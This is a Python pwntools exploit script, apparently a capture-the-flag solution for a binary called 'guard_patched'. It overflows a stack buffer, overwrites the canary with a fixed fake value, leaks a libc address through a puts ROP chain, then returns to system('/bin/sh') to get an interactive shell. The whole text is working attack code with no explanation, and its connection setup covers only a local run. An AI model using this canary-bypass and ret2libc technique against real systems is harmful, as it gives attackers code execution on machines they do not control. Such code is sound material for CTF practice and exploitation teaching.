#!/usr/bin/env python3

from pwn import *

exe = ELF("./guard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe



if args.LOCAL:
    r = process([exe.path])
    #gdb.attach(r, gdbscript='''
    #    b *game+0x55
    #    c
    #    ''')
    #input()



def main():
    pop_rdi_ret = 0x401256
    ret_gadget = 0x40101a

    fake_canary = 0xdeadbeefc0debeef
    
    ## Stage 1: leak libc
    r.sendline(b"1")
    r.sendlineafter(b"len:", b"10000")

    payload = b"A"*(0x30-0x8)

    payload += p64(fake_canary)

    payload += p64(0) #rbp

    payload += p64(pop_rdi_ret) #return address
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.symbols['game'])

    payload = payload.ljust(184, b"\x00")
    payload += p64(fake_canary)

    payload = payload.ljust(2080, b"\x00")
    payload += p64(0x404500)
    payload += p64(0x4052b0)
    payload += p64(0x404500)

    payload += p64(1)
    payload += p64(0)
    payload += p64(fake_canary)
    r.sendline(payload)

    leak_got_puts = u64(r.recvline()[1:-1] + b"\x00\x00")

    libc.address = leak_got_puts - 0x80e50

    print("libc addr: ", hex(libc.address))


    ## Stage 2: ret2libc

    new_payload = b"a"
    new_payload += b"A"*(0x30-0x8)
    new_payload += p64(fake_canary)
    new_payload += p64(0)


    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh'))  
    rop_system_binsh = p64(pop_rdi_ret) + p64(binsh) + p64(ret_gadget) + p64(system) 

    new_payload += rop_system_binsh

    r.sendline(new_payload)


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
